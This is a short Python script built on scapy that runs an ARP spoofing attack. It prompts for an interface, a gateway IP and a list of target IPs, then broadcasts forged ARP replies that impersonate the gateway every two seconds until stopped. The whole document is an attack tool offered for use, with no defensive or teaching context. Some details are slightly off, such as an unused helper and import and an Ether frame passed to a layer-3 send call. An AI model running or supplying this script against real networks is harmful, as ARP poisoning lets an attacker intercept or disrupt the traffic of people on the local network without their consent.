from scapy.all import ARP, Ether, send, sniff
import time

def get_input(prompt):
    return input(prompt).strip()

def spoof_arp(target_ip, gateway_ip, interface):
    # Create ARP response packet
    arp_response = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff")
    ether_frame = Ether(dst="ff:ff:ff:ff:ff:ff") / arp_response
    
    # Send the packet
    send(ether_frame, iface=interface, verbose=False)
    print(f"Sent ARP spoof packet to {target_ip}")

def main():
    # Prompt user for network interface
    interface = input("Enter the network interface (e.g., wlan0): ")

    # Prompt user for gateway IP
    gateway_ip = input("Enter the gateway IP address (e.g., 192.168.0.1): ")

    # Prompt user for the number of target IPs
    num_targets = int(input("Enter the number of target IP addresses: "))

    # Collect target IP addresses
    targets = []
    for i in range(1, num_targets + 1):
        target_ip = input(f"Enter target IP address #{i}: ")
        targets.append(target_ip)

    # Spoof ARP for each target
    try:
        while True:
            for target in targets:
                spoof_arp(target, gateway_ip, interface)
                # Send ARP spoof packets every 2 seconds
                time.sleep(2)
    except KeyboardInterrupt:
        print("ARP spoofing stopped.")

if __name__ == "__main__":
    main()
